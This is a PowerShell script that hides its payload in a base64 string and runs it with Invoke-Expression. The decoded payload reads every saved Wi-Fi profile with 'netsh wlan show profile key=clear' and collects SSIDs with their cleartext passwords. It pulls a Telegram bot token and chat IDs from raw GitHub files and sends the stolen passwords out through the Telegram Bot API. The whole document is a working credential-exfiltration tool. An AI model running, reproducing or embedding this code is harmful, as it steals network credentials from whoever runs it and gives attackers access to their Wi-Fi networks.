$encodedScript = 'IyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcw0KZnVuY3Rpb24gR2V0LVdMQU5fUHJvZmlsZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsICdlbi1FTicpXQ0KICAgICAgICAkTEFOR1VBR0UgPSAkSG9zdC5DdXJyZW50VUlDdWx0dXJlLk5hbWUNCiAgICApDQoNCiAgICAkTEFOR1VBR0VTID0gQHsNCiAgICAgICAgJ2VzLUVTJyA9IEB7DQogICAgICAgICAgICAncHJvZmlsZV9ub3RfZm91bmRfdGV4dCcgPSAnTm8gc2UgZW5jdWVudHJhIGVsIHBlcmZpbCcNCiAgICAgICAgICAgICdzc2lkX25hbWVfdGV4dCcgICAgICAgICA9ICdOb21icmUgZGUgU1NJRCcNCiAgICAgICAgICAgICdrZXlfdGV4dCcgICAgICAgICAgICAgICA9ICdDb250ZW5pZG8gZGUgbGEgY2xhdmUnDQogICAgICAgIH0NCiAgICAgICAgJ2VuLUVOJyA9IEB7DQogICAgICAgICAgICAncHJvZmlsZV9ub3RfZm91bmRfdGV4dCcgPSAnUHJvZmlsZSBub3QgZm91bmQnDQogICAgICAgICAgICAnc3NpZF9uYW1lX3RleHQnICAgICAgICAgPSAnU1NJRCBuYW1lJw0KICAgICAgICAgICAgJ2tleV90ZXh0JyAgICAgICAgICAgICAgID0gJ0tleSBDb250ZW50Jw0KICAgICAgICB9DQogICAgfQ0KDQogICAgJExBTkcgPSAkTEFOR1VBR0VTLiIkTEFOR1VBR0UiDQoNCiAgICBmdW5jdGlvbiBHZXRWYWx1ZUJ5TmFtZSgkaW5wdXRUZXh0LCAkbmFtZVN0cmluZykgew0KICAgICAgICBpZiAoJGlucHV0VGV4dCAtbWF0Y2ggIlxiJG5hbWVTdHJpbmdcYiIpIHsNCiAgICAgICAgICAgIHJldHVybiAkaW5wdXRUZXh0IC1yZXBsYWNlICJeW146XSo6ICIsICIiIC1yZXBsYWNlICdccyokJw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAiIg0KICAgIH0NCg0KICAgICMgT2J0ZW5lciBwZXJmaWxlcyBXTEFODQogICAgJFByb2ZpbGVzID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICBHZXRWYWx1ZUJ5TmFtZSAkXyAkTEFOR1snc3NpZF9uYW1lX3RleHQnXQ0KICAgIH0NCg0KICAgICRXTEFOX1Byb2ZpbGVzID0gQCgpDQoNCiAgICAkUHJvZmlsZXMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICR3bGFuX1Byb2ZpbGUgPSBuZXRzaCB3bGFuIHNob3cgcHJvZmlsZSAkXyBrZXk9Y2xlYXINCg0KICAgICAgICBpZiAoJHdsYW5fUHJvZmlsZSAtY29udGFpbnMgJExBTkdbJ3Byb2ZpbGVfbm90X2ZvdW5kX3RleHQnXSkgew0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIH0NCg0KICAgICAgICAkSW50ZXJmYWNlTmFtZSA9IEdldFZhbHVlQnlOYW1lICR3bGFuX1Byb2ZpbGUgJExBTkdbJ3NzaWRfbmFtZV90ZXh0J10NCg0KICAgICAgICBpZiAoJEludGVyZmFjZU5hbWUpIHsNCiAgICAgICAgICAgICRJbnRlcmZhY2VOYW1lID0gJEludGVyZmFjZU5hbWUuVHJpbSgnIicpDQogICAgICAgICAgICAkSW50ZXJmYWNlTmFtZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkdldEVuY29kaW5nKCJJU08tODg1OS0xIikuR2V0Qnl0ZXMoJEludGVyZmFjZU5hbWUpKQ0KDQogICAgICAgICAgICAkS2V5ID0gR2V0VmFsdWVCeU5hbWUgJHdsYW5fUHJvZmlsZSAkTEFOR1sna2V5X3RleHQnXQ0KDQogICAgICAgICAgICBpZiAoJEtleSkgew0KICAgICAgICAgICAgICAgICRXTEFOX1Byb2ZpbGVzICs9IFtQU0N1c3RvbU9iamVjdF1Aew0KICAgICAgICAgICAgICAgICAgICBTU0lEID0gJEludGVyZmFjZU5hbWUNCiAgICAgICAgICAgICAgICAgICAgS2V5ICA9ICRLZXkNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoJFdMQU5fUHJvZmlsZXMuQ291bnQgLWd0IDApIHsNCiAgICAgICAgIyBDb25zdHJ1aXIgZWwgbWVuc2FqZSBwYXJhIFRlbGVncmFtDQogICAgICAgICRyZXN1bHRNZXNzYWdlID0gIlRvdGFsIFdMQU5fUHJvZmlsZXM6ICQoJFdMQU5fUHJvZmlsZXMuQ291bnQpYHJgblBhc3N3b3JkIFdpRmkgZW5jb250cmFkYXM6YHJgbiINCg0KICAgICAgICAkV0xBTl9Qcm9maWxlcyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJgcmBuU1NJRDogJCgkXy5TU0lEKWByYG5QYXNzd29yZDogJCgkXy5LZXkpYHJgbiINCiAgICAgICAgfQ0KDQogICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJgcmBuQXV0b3I6IEx1aXNoaU5vIFBlcmljZW5hYHJgbk1hcyBpbmZvcm1hY2lvbjogW0Jsb2ddKGh0dHBzOi8vbHBlcmljZW5hLmJsb2dzcG90LmNvbS8pYHJgbklQOmByYG4iDQoNCiAgICAgICAgcmV0dXJuICRyZXN1bHRNZXNzYWdlDQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICdObyBzZSBlbmNvbnRyYXJvbiBwZXJmaWxlcyBXTEFOLicNCiAgICB9DQp9DQoNCiMgRnVuY3Rpb24gdG8gc2VuZCBhIG1lc3NhZ2UgdG8gVGVsZWdyYW0NCmZ1bmN0aW9uIFNlbmQtVGVsZWdyYW1NZXNzYWdlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHRva2VuLA0KICAgICAgICBbc3RyaW5nXSRjaGF0SWQsDQogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UNCiAgICApDQoNCiAgICAkdXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkdG9rZW4vc2VuZE1lc3NhZ2UiDQoNCiAgICAjIERpdmlkaXIgZWwgbWVuc2FqZSBlbiBwYXJ0ZXMgbcOhcyBwZXF1ZcOxYXMgKHBvciBlamVtcGxvLCBjYWRhIDQwOTYgY2FyYWN0ZXJlcykNCiAgICAkbWVzc2FnZVBhcnRzID0gW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXV06Om5ldygpDQogICAgJG1heE1lc3NhZ2VMZW5ndGggPSA0MDk2DQoNCiAgICB3aGlsZSAoJG1lc3NhZ2UuTGVuZ3RoIC1ndCAkbWF4TWVzc2FnZUxlbmd0aCkgew0KICAgICAgICAkbWVzc2FnZVBhcnRzLkFkZCgkbWVzc2FnZS5TdWJzdHJpbmcoMCwgJG1heE1lc3NhZ2VMZW5ndGgpKQ0KICAgICAgICAkbWVzc2FnZSA9ICRtZXNzYWdlLlN1YnN0cmluZygkbWF4TWVzc2FnZUxlbmd0aCkNCiAgICB9DQogICAgJG1lc3NhZ2VQYXJ0cy5BZGQoJG1lc3NhZ2UpDQoNCiAgICBmb3JlYWNoICgkcGFydCBpbiAkbWVzc2FnZVBhcnRzKSB7DQogICAgICAgICRwYXJhbXMgPSBAew0KICAgICAgICAgICAgY2hhdF9pZCA9ICRjaGF0SWQNCiAgICAgICAgICAgIHRleHQgICAgPSAkcGFydA0KICAgICAgICB9DQoNCiAgICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkdXJsIC1NZXRob2QgUG9zdCAtQm9keSAkcGFyYW1zDQogICAgfQ0KfQ0KDQojIFRlbGVncmFtIGNvbmZpZ3VyYXRpb24NCiR0b2tlbkNvbmZpZyA9IEludm9rZS1SZXN0TWV0aG9kICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUGVyaWNlbmEvaGFwcHliaXJ0aGRheS5naXRodWIuaW8vbWFpbi9kYXRvcy9jb25maWcyLnR4dCINCiRjaGF0SWRzID0gSW52b2tlLVJlc3RNZXRob2QgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QZXJpY2VuYS9oYXBweWJpcnRoZGF5LmdpdGh1Yi5pby9tYWluL2RhdG9zL3VzdWFyaW8vbHVpc2hpbm8udHh0Ig0KDQojIFJ1biB0aGUgR2V0LVdMQU5fUHJvZmlsZXMgZnVuY3Rpb24gYW5kIHN0b3JlIHRoZSByZXN1bHQNCiRyZXN1bHQgPSBHZXQtV0xBTl9Qcm9maWxlcw0KDQojIFNlbmQgdGhlIHJlc3VsdCBhcyBhIG1lc3NhZ2UgdG8gZWFjaCBjaGF0IElEDQpmb3JlYWNoICgkY2hhdElkIGluICRjaGF0SWRzKSB7DQogICAgU2VuZC1UZWxlZ3JhbU1lc3NhZ2UgLXRva2VuICR0b2tlbkNvbmZpZyAtY2hhdElkICRjaGF0SWQgLW1lc3NhZ2UgJHJlc3VsdA0KfQ0KDQo='
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
